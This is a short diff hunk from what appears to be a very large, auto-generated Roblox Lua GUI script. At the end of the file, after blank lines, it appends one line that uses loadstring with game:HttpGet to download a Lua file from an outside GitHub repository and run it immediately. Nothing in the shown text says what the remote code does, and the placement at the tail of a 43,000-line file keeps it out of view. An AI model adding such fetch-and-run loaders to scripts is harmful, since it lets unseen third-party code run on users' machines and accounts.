@@ -43396,3 +43396,8 @@ local function XYHY_fake_script() -- x.LocalScript
 		end)
 end
 coroutine.wrap(XYHY_fake_script)()
+
+
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/GamerEmilianoFF/scripts/main/theow.lua", true))()
+
